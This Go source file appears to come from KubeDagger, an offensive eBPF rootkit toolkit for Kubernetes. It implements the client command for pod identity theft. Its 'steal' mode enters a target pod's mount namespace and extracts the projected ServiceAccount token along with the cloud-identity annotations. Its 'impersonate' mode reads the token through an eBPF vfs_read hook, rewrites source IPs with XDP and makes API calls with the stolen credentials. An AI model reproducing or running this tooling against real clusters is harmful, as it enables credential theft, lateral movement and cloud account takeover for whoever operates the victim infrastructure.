package pod_identity

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type StealResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool               `json:"success"`
}

func Execute(target, targetPod, namespace, action, output string) error {
	result := &StealResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch action {
	case "impersonate":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"steal_token", "read projected SA token from target pod /var/run/secrets/ via eBPF vfs_read hook", "podid_steal_token"},
			{"identify_ip", "determine target pod IP from CNI state or /proc/net/fib_trie", "podid_identify_ip"},
			{"spoof_source", "configure XDP program to rewrite source IP to match target pod", "podid_spoof_ip"},
			{"impersonate_api", "make API calls using stolen token from spoofed source IP", "podid_impersonate"},
		}
	default: // steal
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"locate_pod", "identify target pod cgroup and namespace via /proc scanning", "podid_locate"},
			{"enter_mount_ns", "access target pod mount namespace to read projected volumes", "podid_enter_ns"},
			{"steal_token", "extract projected ServiceAccount token from volume mount", "podid_steal_token"},
			{"extract_annotations", "read pod annotations for cloud identity (IRSA/Workload Identity)", "podid_annotations"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + action + "#" + targetPod + "#" + namespace
		status := shared.SendCommand(target, "/pod_identity", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
